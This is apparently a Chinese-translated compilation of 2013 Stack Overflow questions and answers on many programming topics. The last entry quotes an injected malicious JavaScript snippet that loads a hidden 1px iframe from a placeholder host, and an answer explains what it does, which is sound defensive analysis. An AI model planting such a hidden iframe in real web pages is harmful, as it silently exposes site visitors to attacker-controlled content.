实现高性能显示复杂视图的最佳方法是采用这种`UITableView`方法并重用屏幕外视图，而不是创建新视图。最简单的方法是只使用表格视图和自定义单元格，但如果表格视图的假设没有意义，也可以自行滚动。

# xcode - Xcode：随机标签生成器不重复？

> ID：15825355
> 
> 赞同：0
> 
> 时间：2013-04-05T03:19:46.683
> 
> 标签：xcode, label, generator, repeat

我正在创建一个具有随机标签生成器的应用程序，但我发现它有时会重复。我想知道我是否可以立即解决这个问题，但我不知道该怎么做？任何帮助将不胜感激。我提供了我的 .h 和 .m 文件。这是我的.h

```
#import <UIKit/UIKit.h>
#import "MessageUI/MessageUI.h"
#import "Social/Social.h"
#import "Accounts/Accounts.h"
#import <iAd/iAd.h>

@interface ViewController2 : UIViewController <MFMessageComposeViewControllerDelegate,    ADBannerViewDelegate> {
SLComposeViewController *mySLComposerSheet;
//label that is being randomly generated.
IBOutlet UILabel *label;

}

-(IBAction)randomButton;
-(IBAction)randomButton2;
-(IBAction)SendSMS:(id)sender;
-(IBAction)PostToFacebook:(id)sender;
- (IBAction)SendATweet:(id)sender;

@end 
```

这是我的.m

```
-(IBAction)randomButton {
int randomText = rand() %151;
switch (randomText) {
    case 0:
        label.text = @"1";
        break;
    case 1:
        label.text = @"2";
        break;
    case 2:
        label.text = @"3";
        break;
    case 3:
        label.text = @"4";
        break;
    case 4:
        label.text = @"5";
        break;
    case 5:
        label.text = @"6";
        break;
    case 6:
        label.text = @"7";
        break;
    case 7:
        label.text = @"";
        break;
    case 8:
        label.text = @"8";
        break;
    case 9:
        label.text = @"9";
        break;
    case 10:
        label.text = @"10";
        break;
    case 11:
        label.text = @"11";
    //ect..... 
```

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T03:44:27.513

您的随机数将在某个时间点重复，但您可以存储它们并检查。一个直到 150 的所有数字都被填满，重置并重新开始。

你可以这样做：

```
-(IBAction)randomButton {
    NSInteger random=arc4random()%151;
    if ([self.randomNumbers containsObject:@(randomNumbers)]) {
        [self randomButton];
    }
    else{
        [self.randomNumbers addObject:@(random)];
    }
    label.text=[NSString stringWithFormat:@"%d",random+1];
} 
```

这里，`randomNumbers`是 NSMutableArray 类型的属性。重置时使其为空。

# java - JSON 响应中的 @type

> ID：15825358
> 
> 赞同：1
> 
> 时间：2013-04-05T03:20:12.937
> 
> 标签：java, json, jersey, jackson, generics

我有一个通用类：

```
@XmlSeeAlso({/*my classes here*/})
@XmlRootElement
public class Response<T> implements Serializable{ /*fields*/} 
```

当 JSON 响应从服务器返回时，它带有一个 @type 信息。我想从响应中删除它。任何帮助，将不胜感激。

响应如下所示：

```
{"response":{"@type":"myType","email":"abc@abc.com","firstName":"A","id":"3","lastName":"B","password":"12345","userName":"user"}} 
```

我希望这不是杰克逊或泽西的错误。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T07:53:07.643

这通常会出现，因为您的`Response`类被注释了`@JsonTypeInfo`。如果您不想要它，那么您可以删除此注释，但请记住，您将不会获得有关您返回的类型的任何信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-05T03:44:54.000

我也在为此苦苦挣扎，但是这个问题很相似，答案很有效[使用 JAXB 将通用 Java 类绑定到 JSON](https://stackoverflow.com/questions/3422545/binding-a-generic-java-class-to-a-json-using-jaxb)

这是一个相当简单的答案，尽管我很难解释它为什么或如何工作并且不会导致映射发生。

# ruby-on-rails - Nginx Rails 错误

> ID：15825361
> 
> 赞同：2
> 
> 时间：2013-04-05T03:20:26.863
> 
> 标签：ruby-on-rails, ruby, nginx, passenger

当我启动 nginx 时，我收到此错误：

```
Preloader for /u/apps/Dismissrr/current started on PID 23521, listening on unix:/tmp/passenger.1.0.23443/generation-0/backends/preloader.23521
[ 2013-04-05 03:16:30.9237 23447/7fb12e117700 Pool2/Implementation.cpp:1144 ]: [App 23521 stderr] [ 2013-04-05 03:16:30.9235 23559/0x0000000664d420(Worker 1) utils.rb:55 ]: *** Exception SocketError in Rack application object (getaddrinfo: Name or service not known) (process 23559, thread 0x0000000664d420(Worker 1)):
[ 2013-04-05 03:16:30.9240 23447/7fb12e117700 Pool2/Implementation.cpp:1144 ]: [App 23521 stderr]   from /u/apps/Dismissrr/shared/bundle/ruby/1.9.1/gems/gelf-1.3.2/lib/gelf/ruby_sender.rb:16:in `send'
[ 2013-04-05 03:16:30.9241 23447/7fb12e117700 Pool2/Implementation.cpp:1144 ]: [App 23521 stderr]   from /u/apps/Dismissrr/shared/bundle/ruby/1.9.1/gems/gelf-1.3.2/lib/gelf/ruby_sender.rb:16:in `block in send_datagrams'
[ 2013-04-05 03:16:30.9242 23447/7fb12e117700 Pool2/Implementation.cpp:1144 ]: [App 23521 stderr]   from /u/apps/Dismissrr/shared/bundle/ruby/1.9.1/gems/gelf-1.3.2/lib/gelf/ruby_sender.rb:15:in `each'
[ 2013-04-05 03:16:30.9243 23447/7fb12e117700 Pool2/Implementation.cpp:1144 ]: [App 23521 stderr]   from /u/apps/Dismissrr/shared/bundle/ruby/1.9.1/gems/gelf-1.3.2/lib/gelf/ruby_sender.rb:15:in `send_datagrams'
[ 2013-04-05 03:16:30.9245 23447/7fb12e117700 Pool2/Implementation.cpp:1144 ]: [App 23521 stderr]   from /u/apps/Dismissrr/shared/bundle/ruby/1.9.1/gems/gelf-1.3.2/lib/gelf/notifier.rb:143:in `notify_with_level!'
[ 2013-04-05 03:16:30.9246 23447/7fb12e117700 Pool2/Implementation.cpp:1144 ]: [App 23521 stderr]   from /u/apps/Dismissrr/shared/bundle/ruby/1.9.1/gems/gelf-1.3.2/lib/gelf/notifier.rb:131:in `notify_with_level'
[ 2013-04-05 03:16:30.9247 23447/7fb12e117700 Pool2/Implementation.cpp:1144 ]: [App 23521 stderr]   from /u/apps/Dismissrr/shared/bundle/ruby/1.9.1/gems/gelf-1.3.2/lib/gelf/logger.rb:25:in `add'
[ 2013-04-05 03:16:30.9248 23447/7fb12e117700 Pool2/Implementation.cpp:1144 ]: [App 23521 stderr]   from /u/apps/Dismissrr/shared/bundle/ruby/1.9.1/gems/gelf-1.3.2/lib/gelf/logger.rb:33:in `info'
[ 2013-04-05 03:16:30.9249 23447/7fb12e117700 Pool2/Implementation.cpp:1144 ]: [App 23521 stderr]   from /u/apps/Dismissrr/releases/20130405020833/config/initializers/graylog.rb:13:in `block in method_missing'
[ 2013-04-05 03:16:30.9250 23447/7fb12e117700 Pool2/Implementation.cpp:1144 ]: [App 23521 stderr]   from /u/apps/Dismissrr/releases/20130405020833/config/initializers/graylog.rb:13:in `each'
[ 2013-04-05 03:16:30.9251 23447/7fb12e117700 Pool2/Implementation.cpp:1144 ]: [App 23521 stderr]   from /u/apps/Dismissrr/releases/20130405020833/config/initializers/graylog.rb:13:in `method_missing'
[ 2013-04-05 03:16:30.9252 23447/7fb12e117700 Pool2/Implementation.cpp:1144 ]: [App 23521 stderr]   from /u/apps/Dismissrr/shared/bundle/ruby/1.9.1/gems/railties-3.2.13/lib/rails/rack/logger.rb:31:in `call_app'
[ 2013-04-05 03:16:30.9253 23447/7fb12e117700 Pool2/Implementation.cpp:1144 ]: [App 23521 stderr]   from /u/apps/Dismissrr/shared/bundle/ruby/1.9.1/gems/railties-3.2.13/lib/rails/rack/logger.rb:18:in `call'
[ 2013-04-05 03:16:30.9254 23447/7fb12e117700 Pool2/Implementation.cpp:1144 ]: [App 23521 stderr]   from /u/apps/Dismissrr/shared/bundle/ruby/1.9.1/gems/actionpack-3.2.13/lib/action_dispatch/middleware/request_id.rb:22:in `call'
[ 2013-04-05 03:16:30.9256 23447/7fb12e117700 Pool2/Implementation.cpp:1144 ]: [App 23521 stderr]   from /u/apps/Dismissrr/shared/bundle/ruby/1.9.1/gems/rack-1.4.5/lib/rack/methodoverride.rb:21:in `call'
[ 2013-04-05 03:16:30.9257 23447/7fb12e117700 Pool2/Implementation.cpp:1144 ]: [App 23521 stderr]   from /u/apps/Dismissrr/shared/bundle/ruby/1.9.1/gems/rack-1.4.5/lib/rack/runtime.rb:17:in `call'
[ 2013-04-05 03:16:30.9258 23447/7fb12e117700 Pool2/Implementation.cpp:1144 ]: [App 23521 stderr]   from /u/apps/Dismissrr/shared/bundle/ruby/1.9.1/gems/activesupport-3.2.13/lib/active_support/cache/strategy/local_cache.rb:72:in `call'
[ 2013-04-05 03:16:30.9259 23447/7fb12e117700 Pool2/Implementation.cpp:1144 ]: [App 23521 stderr]   from /u/apps/Dismissrr/shared/bundle/ruby/1.9.1/gems/rack-1.4.5/lib/rack/lock.rb:15:in `call'
[ 2013-04-05 03:16:30.9260 23447/7fb12e117700 Pool2/Implementation.cpp:1144 ]: [App 23521 stderr]   from /u/apps/Dismissrr/shared/bundle/ruby/1.9.1/gems/rack-ssl-1.3.3/lib/rack/ssl.rb:27:in `call'
[ 2013-04-05 03:16:30.9261 23447/7fb12e117700 Pool2/Implementation.cpp:1144 ]: [App 23521 stderr]   from /u/apps/Dismissrr/shared/bundle/ruby/1.9.1/gems/rack-cache-1.2/lib/rack/cache/context.rb:136:in `forward'
[ 2013-04-05 03:16:30.9262 23447/7fb12e117700 Pool2/Implementation.cpp:1144 ]: [App 23521 stderr]   from /u/apps/Dismissrr/shared/bundle/ruby/1.9.1/gems/rack-cache-1.2/lib/rack/cache/context.rb:245:in `fetch'
[ 2013-04-05 03:16:30.9263 23447/7fb12e117700 Pool2/Implementation.cpp:1144 ]: [App 23521 stderr]   from /u/apps/Dismissrr/shared/bundle/ruby/1.9.1/gems/rack-cache-1.2/lib/rack/cache/context.rb:185:in `lookup'
[ 2013-04-05 03:16:30.9264 23447/7fb12e117700 Pool2/Implementation.cpp:1144 ]: [App 23521 stderr]   from /u/apps/Dismissrr/shared/bundle/ruby/1.9.1/gems/rack-cache-1.2/lib/rack/cache/context.rb:66:in `call!'
[ 2013-04-05 03:16:30.9265 23447/7fb12e117700 Pool2/Implementation.cpp:1144 ]: [App 23521 stderr]   from /u/apps/Dismissrr/shared/bundle/ruby/1.9.1/gems/rack-cache-1.2/lib/rack/cache/context.rb:51:in `call'
[ 2013-04-05 03:16:30.9266 23447/7fb12e117700 Pool2/Implementation.cpp:1144 ]: [App 23521 stderr]   from /u/apps/Dismissrr/shared/bundle/ruby/1.9.1/gems/railties-3.2.13/lib/rails/engine.rb:479:in `call'
[ 2013-04-05 03:16:30.9267 23447/7fb12e117700 Pool2/Implementation.cpp:1144 ]: [App 23521 stderr]   from /u/apps/Dismissrr/shared/bundle/ruby/1.9.1/gems/railties-3.2.13/lib/rails/application.rb:223:in `call'
[ 2013-04-05 03:16:30.9268 23447/7fb12e117700 Pool2/Implementation.cpp:1144 ]: [App 23521 stderr]   from /u/apps/Dismissrr/shared/bundle/ruby/1.9.1/gems/railties-3.2.13/lib/rails/railtie/configurable.rb:30:in `method_missing'
[ 2013-04-05 03:16:30.9269 23447/7fb12e117700 Pool2/Implementation.cpp:1144 ]: [App 23521 stderr]   from /usr/local/rvm/gems/ruby-1.9.3-p385/gems/passenger-enterprise-server-4.0.0.rc5/lib/phusion_passenger/rack/thread_handler_extension.rb:56:in `process_request'
[ 2013-04-05 03:16:30.9270 23447/7fb12e117700 Pool2/Implementation.cpp:1144 ]: [App 23521 stderr]   from /usr/local/rvm/gems/ruby-1.9.3-p385/gems/passenger-enterprise-server-4.0.0.rc5/lib/phusion_passenger/request_handler/thread_handler.rb:119:in `accept_and_process_next_request'
[ 2013-04-05 03:16:30.9271 23447/7fb12e117700 Pool2/Implementation.cpp:1144 ]: [App 23521 stderr]   from /usr/local/rvm/gems/ruby-1.9.3-p385/gems/passenger-enterprise-server-4.0.0.rc5/lib/phusion_passenger/request_handler/thread_handler.rb:90:in `main_loop'
[ 2013-04-05 03:16:30.9272 23447/7fb12e117700 Pool2/Implementation.cpp:1144 ]: [App 23521 stderr]   from /usr/local/rvm/gems/ruby-1.9.3-p385/gems/passenger-enterprise-server-4.0.0.rc5/lib/phusion_passenger/request_handler.rb:463:in `block (4 levels) in start_threads'
[ 2013-04-05 03:16:30.9273 23447/7fb12e117700 Pool2/Implementation.cpp:1144 ]: [App 23521 stderr]   from /usr/local/rvm/gems/ruby-1.9.3-p385/gems/passenger-enterprise-server-4.0.0.rc5/lib/phusion_passenger/utils/robust_interruption.rb:102:in `disable_interruptions'
[ 2013-04-05 03:16:30.9274 23447/7fb12e117700 Pool2/Implementation.cpp:1144 ]: [App 23521 stderr]   from /usr/local/rvm/gems/ruby-1.9.3-p385/gems/passenger-enterprise-server-4.0.0.rc5/lib/phusion_pa
[ 2013-04-05 03:16:30.9276 23447/7fb12e117700 Pool2/Implementation.cpp:1144 ]: [App 23521 stderr] ssenger/request_handler.rb:458:in `block (3 levels) in start_threads'
2013/04/05 03:16:30 [error] 23462#0: *1 upstream prematurely closed connection while reading response header from upstream, client: 206.205.249.126, server: demo.dismissrr.com, request: "GET /admin HTTP/1.1", upstream: "passenger:unix:/passenger_helper_server:", host: "demo.dismissrr.com" 
```

我的配置中的 server_name 是“demo.dismissrr.com”

为什么会发生这种情况？

我正在使用：

*   红宝石 1.9.3
*   导轨 3.2.13
*   客运企业 4.0.0 修订版 5

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T00:19:49.637

getaddrinfo 可能会告诉您它无法解析 DNS 名称。可能需要静态 /etc/hosts 映射或在某处修复一些 DNS。虽然了解您，但您现在已经想通了 :) 很高兴收到您的来信，Baumgarten 先生。

# python - django 相关管理器 - 在模板中

> ID：15825362
> 
> 赞同：4
> 
> 时间：2013-04-05T03:20:27.273
> 
> 标签：python, database, django, django-related-manager

我正在尝试显示某个位置的最新评分。我有 2 张桌子（django 模型）

```
Class Location(models.Model):
   locationname = models.CharField()
   ...

Class Rating(models.Model):
   von_location = models.ForeignKey(Location,related_name="locations_rate")
   rating = models.IntegerField() 
```

现在在我的数据库中，一个位置（id=1）有 3 个评级（1,2,4）。

我想显示一个位置的最新评分记录。我可以以某种方式使用相关管理器在模板中执行此操作吗？

我的愿景是：

```
all_locs = Location.objects.all() 
```

然后在模板中：

```
{% for location in all_locs %}
   {{ location.locations_rate.latest }}
{% endfor %} 
```

相关经理可以做这种事情吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-05T03:51:36.033

我在您的其他相关问题中的回答：

模型.py

```
class Location(models.Model):
    locationname = models.CharField(max_length=100)

    def __unicode__(self):
        return self.locationname

    def latest(self):
        return Rating.objects.values('rating').filter(von_location=self).order_by('-id')[0]

class Rating(models.Model):
   von_location = models.ForeignKey(Location,related_name="locations_rate")
   rating = models.IntegerField()

   def __unicode__(self):
        return "{0}".format(self.rating) 
```

视图.py

```
all_locs = Location.objects.all() 
```

模板

```
{% for location in all_locs %}
   {{ location.locationname }} - {{ location.latest.rating }}<br/>
{% endfor %} 
```

# android - 如何在 Android 上实现类似 chrome 的卡片 UI？

> ID：15825369
> 
> 赞同：-5
> 
> 时间：2013-04-05T03:22:20.417
> 
> 标签：android, android-layout

我想在 Android 上实现一个类似于 chrome 的卡片 UI。我应该怎么做？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-05T03:26:16.483

很模糊的问题，下次你可能想尝试一个简单的谷歌搜索。

不过看看这个，可能就是你要找的东西：
[http ://www.androidviews.net/2012/12/cardsui/](http://www.androidviews.net/2012/12/cardsui/)

# c# - Kinect 骨骼数据传输到另一个事件

> ID：15825376
> 
> 赞同：0
> 
> 时间：2013-04-05T03:22:59.557
> 
> 标签：c#, kinect, gesture-recognition

我目前正在使用 Kinect 在 Visual Studio 中开发一个项目。我想知道如何检测用户的骨骼数据，播放声音，然后转换到另一个事件。

这是基本的 SkeletonFrameReady 事件：

```
 private void kinect_SkeletonFrameReady(object sender, SkeletonFrameReadyEventArgs e)  
        {  
            using (SkeletonFrame skeletonFrame = e.OpenSkeletonFrame()) // Open the   Skeleton frame  
            {  
                if (skeletonFrame != null && this.skeletonData != null) // check that a   frame is available  
                {   
                    skeletonFrame.CopySkeletonDataTo(this.skeletonData); // get the   skeletal information in this frame  
                }  
            }  
        } 
```

我的应用程序目标是使用骨骼数据来检测用户，并转换到另一个 xaml 文件。这可能吗？谢谢你的时间。

# c++ - 如何从 main.cpp 文件中的单独 cpp 文件调用函数？

> ID：15825380
> 
> 赞同：1
> 
> 时间：2013-04-05T03:23:21.133
> 
> 标签：c++, file, function, header

我有以下 Timer.cpp、Timer.h 和 main.cpp 文件。我正在尝试从我的 main.cpp 文件中的 Timer.cpp 文件中调用函数，并将 Timer.h 包含在 main.cpp 中，但它仍然无法正常工作。有人可以解释为什么吗？我对 C++ 有点生疏，感觉自己犯了一个愚蠢的错误。提前感谢您的帮助。

```
#Timer.h file

#ifndef __Notes__Timer__
#define __Notes__Timer__

#include <iostream>

class Timer {
public:
    Timer();
    void start();
    void stop();
    void clear();
    float getDelta();
};

#endif 
```

* * *

```
#Timer.cpp file    
#include "Timer.h"

clock_t startTime;
clock_t stopTime;

Timer::Timer(){
    startTime = 0;
    stopTime = 0;
}//Timer

void start(){
    startTime = clock();
}//start

void stop(){
    stopTime = clock();
}//stop

float getDelta(){
    return stopTime-startTime;
}//getDelta 
```

* * *

```
#main.cpp file

#include "Timer.h"
#include <iostream>

using namespace std;

int main(){
    char quit;
    start();
    cout << "Would you like to quit? Y or N: ";
    cin >> quit;
    if (quit != 'Y' || quit != 'y'){
        while (quit != 'Y' || quit != 'y'){
            cout << "Would you like to quit? Y or N: ";
            cin >> quit;
        }//while
    }//if
    else {
        stop();
        cout << getDelta();
        exit(0);
    }//else
}//main 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T03:26:47.857

你可以在 Timer.c 中使用这些函数并使用这个 class::function

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T03:31:53.723

似乎它不起作用的原因有两件事：您的 Timer 函数定义未绑定到 Timer 类。例如 Timer.cpp 中 start 的函数定义需要

```
 void Timer::start()
     {
       //Do stuff
     } 
```

Timer.cpp 文件中的所有其他函数都需要遵循相同的语法。此外 startTime 和 stopTime 变量应该像这样放在 Timer.h 文件中：

```
class Timer
{
  private:
    clock_t startTime;
    clock_t stopTime;

  public:
    Timer();
    void start();
    //etc
} 
```

接下来，在 main 函数中，您需要创建一个 Timer 对象：

```
 int main()
 {
   char quit;
   Timer* timer_obj = new Timer();
   timer_obj -> start();
   //Do stuff
   timer_obj -> stop();
   cout << timer_obj -> getDelta() ;
   delete timer_obj ;
   //exit
 } 
```

# sql - 我需要做一个子查询

> ID：15825381
> 
> 赞同：3
> 
> 时间：2013-04-05T03:23:29.813
> 
> 标签：sql, count, group-by, subquery, h2

我有两张桌子：邀请和活动。

我需要在同一个查询中获取活动的名称、每个活动的客人总数以及每个活动真实时的礼物总数！

像加入两个表（左加入）选择 events.name、count(invitations.guest)、count(invitations.presents when = true) 并按事件分组...

查看表格数据...

![https://dl.dropbox.com/u/360112/Duda/invitaciones.jpg](https://i.stack.imgur.com/vhAXb.jpg) ![https://dl.dropbox.com/u/360112/Duda/eventos.jpg](https://i.stack.imgur.com/1kOOt.jpg)

我认为它可以工作，但我没有得到我想要的......

```
SELECT e.name, count(in.guest) as Guests, (SELECT count(presents) 
FROM watermelon.invitations WHERE presents = true) as Presents 
FROM watermelon.events e LEFT JOIN watermelon.invitations in ON e.id = in.event 
GROUP BY in.event; 
```

然后我得到：

[http://dl.dropbox.com/u/360112/Duda/resultado.jpg](http://dl.dropbox.com/u/360112/Duda/resultado.jpg)

有什么建议吗？请我需要它，我厌倦了尝试并得到错误的结果......提前谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T03:28:37.810

听起来你想要这样的东西使用`COUNT`,`GROUP BY`和`CASE`：

```
SELECT E.Id, 
    E.Name, 
    COUNT(I.Id) TotalGuests,
    COUNT(CASE WHEN I.Presents = 'TRUE' THEN 1 END) TotalPresents
FROM Events E
    LEFT JOIN Invitations I ON E.Id = I.Event
GROUP BY E.Id, E.Name 
```

我对您的 Presents 数据类型并不肯定，但这应该很接近。还使用 a`LEFT JOIN`返回所有事件。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-05T04:21:03.193

问题是您的子查询
`(SELECT count(presents) FROM watermelon.invitations WHERE presents = true)`
没有进行任何过滤；它只是在每次调用时都用真值计算表中的所有记录。下面的查询应该按照您需要的方式进行。除了我添加了“and subq.event=e.id”条件之外，这与您的查询完全相同，它将子查询限制为仅针对该特定记录的数据：
`SELECT e.name, count(in.guest) as Guests, (SELECT count(subq.presents) FROM watermelon.invitations as subq WHERE subq.presents = true and subq.event=e.id) as Presents FROM watermelon.events e LEFT JOIN watermelon.invitations in ON e.id = in.event GROUP BY in.event;`

# jquery - AJAX 加载后无法获取正确的 innerHTML

> ID：15825383
> 
> 赞同：0
> 
> 时间：2013-04-05T03:23:41.030
> 
> 标签：jquery

我成功地更新`innerHTML`了一个元素`ajax`......但是当我想使用相同`innerHTML`的那个元素 `.htm()`时，我无法获得更新的innerHTML......

它在加载文档时返回上一个标记......

如何解决这个..？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T04:18:13.177

而不是使用 html() 尝试直接使用内部 html。即，而不是类似的东西

```
var youobj = $(".someselector");
var html = yourobj.html(); 
```

做：

```
var youobj = $(".someselector");
var html = yourobj[0].innerHTML; 
```

尽管无可否认，两者都应该给出相同的结果。

# highcharts - 有没有办法缩放高图表散点图的自定义标记？

> ID：15825384
> 
> 赞同：2
> 
> 时间：2013-04-05T03:23:44.527
> 
> 标签：highcharts

我们正在为高位图表散点图使用一些自定义标记。

marker.radius 属性用于增加点标记的大小。

但是，当使用自定义图像时，半径设置不会增加自定义标记的大小。

这在高图表中是否可行，还是我们需要为每个可能的标记大小创建图像？

这是我尝试过的代码：

```
$(function () {
    $('#container').highcharts({
        chart: {
        },
        xAxis: {
            categories: ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec']
        },

        series: [{
            data: [29.9, 71.5, 106.4, 129.2, 144.0, 176.0, 135.6, 148.5, 316.4, 294.1, 195.6, 154.4],
            marker: {
                symbol: 'triangle', 
                radius: 15

            }
        }, {
            data: [216.4, 194.1, 95.6, 54.4, 29.9, 71.5, 106.4, 129.2, 144.0, 176.0, 135.6, 148.5],
            marker: {
                symbol: 'url(http://highcharts.com/demo/gfx/sun.png)', 
                radius: 50
            }
        }]
    });
}); 
```

三角形按预期增加，太阳没有。

这是一个 JsFiddle 的链接，您可以在其中自己尝试：

[例子](http://jsfiddle.net/gh/get/jquery/1.7.2/highslide-software/highcharts.com/tree/master/samples/highcharts/plotoptions/series-marker-symbol/)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-05T09:36:09.040

您可以修改 SVG 元素中的宽度/高度参数，如下例所示：

[http://jsfiddle.net/CedjX/](http://jsfiddle.net/CedjX/)

```
 setTimeout(function(){
                chart.series[1].data[0].graphic.attr({
                    width: 50,
                    height: 50
                });
            }, 1) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-11-25T09:52:09.313

从 4.0.4 开始，您可以设置高度和宽度

请参阅[文档](http://api.highcharts.com/highcharts#series%3Cspline%3E.data.marker)了解详细信息，具体取决于您的图表要求。

# r - 嵌入在字符串名称中的R变量中的for循环

> ID：15825390
> 
> 赞同：2
> 
> 时间：2013-04-05T03:24:07.030
> 
> 标签：r, for-loop, statistics

我是 R 新手，在创建一个 for 循环时遇到了麻烦，我可以在其中使用字符串名称中的变量。例如：

```
lm1 <- lm(a~b+c)
lm2 <- lm(a~b+d)
lm3 <- lm(a~b+e)

for(i in 1:3){
  summary(lm${i})
} 
```

任何帮助，将不胜感激！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-05T03:43:13.583

在列表中工作。

将您的模型列入列表

```
model_list <- mget(paste0('lm',1:3), envir = parent.frame())
# apply summary on each element of a list
lapply(model_list, summary) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-05T03:27:02.217

您需要使用`get`和`paste0`。`paste0`连接它的参数 `get`将获取名称由其参数中的字符串定义的对象

尝试

```
for(i in 1:3){
  summary(get(paste0('lm',i)))
} 
```

# gradle - gradle 项目中的路径配置

> ID：15825398
> 
> 赞同：1
> 
> 时间：2013-04-05T03:25:31.313
> 
> 标签：gradle

我有一个像这样格式化的 gradle 项目

*   `container/`
    *   `dist/`
    *   `mod1/`
        *   `build.gradle`
    *   `mod2/`
        *   `build.gradle`
    *   `mod3/`
        *   `build.gradle`
    *   `build.gradle`

基本上是一个有很多子模块的年级项目。我想要做的是，当您在 container/build.gradle 上运行程序集时，它会在所有子项目上运行构建。那部分很容易。现在我正在尝试在所有内容中集中配置设置和参数。

这是我的 container/build.gradle 文件中的一个片段

```
subprojects {
    apply plugin: 'java'
    apply plugin: 'scala'

    jar {
        manifest.attributes provider: 'OnusPride'
    }

    property {
        sourceCompatibility = 1.7
        archivePath = file("dist")
    }

    ext {
        springVersion = "3.2.1.RELEASE"
        springSecurityWebVersion = "3.1.3.RELEASE"
        springSecurityOauth2Version = "1.0.1.RELEASE"
        jacksonCoreVersion = "2.1.2"
    }

    dependencies {
        testCompile 'junit:junit:4.8.2'
    }
} 
```

我正在尝试配置所有模块，当它们完成各种组装任务时，javajar、scalajar、war 等，以将输出放在容器/dist 文件夹中。我怎么做？

另外，有没有人有一个相当复杂、编写良好的多模块 gradle 项目的例子。比 hello world 内容更重要的东西会非常有帮助。同时学习 groovy 和 gradle 有点困难。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T14:12:24.140

我认为你有不同的选择。一种解决方案可能是在子项目中引入一个通用任务，将 AbstractArchiveTask 类型的任务的所有输出复制到 dist 文件夹。这看起来像这样：

```
subprojects{
    task copyToDists(type:Copy){
         into project.rootProject.file("dists")
         from tasks.withType(AbstractArchiveTask)
    }
} 
```

这个解决方案有一些开销，并且不被认为是最佳实践，因为您开始在构建中重新排列东西。更好的方法是重新配置相应的任务，以在所需文件夹中默认创建 jars、wars、zips：

```
subprojects{
    tasks.withType(AbstractArchiveTask){
        destinationDir = project.rootProject.file("dists")
    }
} 
```

希望有帮助。

干杯，勒内

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T18:35:33.363

这是一个我还没有达到但我即将面对的问题。我计划在其中创建一个任务，该任务`container/build.gradle`将在其所有子项目中找到人工制品，然后将它们复制到`dist`目录中。

# api - 在 gwt-dnd API 中找不到类 DemoDragHandler

> ID：15825402
> 
> 赞同：0
> 
> 时间：2013-04-05T03:25:59.793
> 
> 标签：api, gwt

我可以获得包含该类的 gwt API 的链接`com.allen_sauer.gwt.dnd.demo.client.DemoDragHandler`吗？

我到处找，但找不到。请帮忙。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T03:46:08.087

[这是gwt-dnd](http://code.google.com/p/gwt-dnd/)库示例的类部分。

[http://code.google.com/p/gwt-dnd/source/browse/DragDrop/demo/com/allen_sauer/gwt/dnd/demo/client/DemoDragHandler.java](http://code.google.com/p/gwt-dnd/source/browse/DragDrop/demo/com/allen_sauer/gwt/dnd/demo/client/DemoDragHandler.java)

您可以从他们的 git 存储库在 googlecode: 下载完整的项目代码（包括示例）`git clone https://code.google.com/p/gwt-dnd/`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T05:28:29.620

这是你提到的那个类的API

[DemoDragHandler](http://www.jarvana.com/jarvana/view/com/allen-sauer/gwt/dnd/gwt-dnd/3.1.2/gwt-dnd-3.1.2-javadoc.jar!/com/allen_sauer/gwt/dnd/demo/client/DemoDragHandler.html)

[类层次结构](http://www.jarvana.com/jarvana/view/com/allen-sauer/gwt/dnd/gwt-dnd/3.1.2/gwt-dnd-3.1.2-javadoc.jar!/com/allen_sauer/gwt/dnd/demo/client/package-tree.html?terms=com.allen_sauer.gwt.dnd.demo.client.DemoDragHandler)

[整个jar包结构](http://www.jarvana.com/jarvana/inspect/com/allen-sauer/gwt/dnd/gwt-dnd/3.1.2/gwt-dnd-3.1.2-javadoc.jar)

[下载罐子](http://repo1.maven.org/maven2/com/allen-sauer/gwt/dnd/gwt-dnd/3.1.2/gwt-dnd-3.1.2-javadoc.jar)

顺便说一句..我是通过[Jarvana.com找到的](http://www.jarvana.com/jarvana/)

# javascript - 恶意 JavaScript 代码

> ID：15825408
> 
> 赞同：2
> 
> 时间：2013-04-05T03:27:01.197
> 
> 标签：javascript

这个恶意 javascript 代码到底在做什么？

```
(function () {
    var qk = document.createElement('iframe');

    qk.src = 'http://xxx.tld/wp-includes/dtd.php';
    qk.style.position = 'absolute';
    qk.style.border = '0';
    qk.style.height = '1px';
    qk.style.width = '1px';
    qk.style.left = '1px';
    qk.style.top = '1px';

    if (!document.getElementById('qk')) {
        document.write('<div id=\'qk\'></div>');
        document.getElementById('qk').appendChild(qk);
    }
})(); 
```

该网站`http://xxx.tld/wp-includes/dtd.php`刚刚返回OK。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-05T03:29:45.913

这是：

```
(function () {
    var qk = document.createElement('iframe');  // creating an iframe

    qk.src = 'http://xxx.tld/wp-includes/dtd.php';  // pointing it at a webpage

    /*
    making the iframe only take up a 1px by 1px square
    in the top left-hand corner of the web page it is injected into
    */
    qk.style.position = 'absolute';
    qk.style.border = '0';
    qk.style.height = '1px';
    qk.style.width = '1px';
    qk.style.left = '1px';
    qk.style.top = '1px';

    /*
    Adding the iframe to the DOM by creating a <div> with an ID of "qt"
    (If the div has not been created already)
    */    
    if (!document.getElementById('qk')) {
        document.write('<div id=\'qk\'></div>');
        document.getElementById('qk').appendChild(qk);
    }
})(); 
```

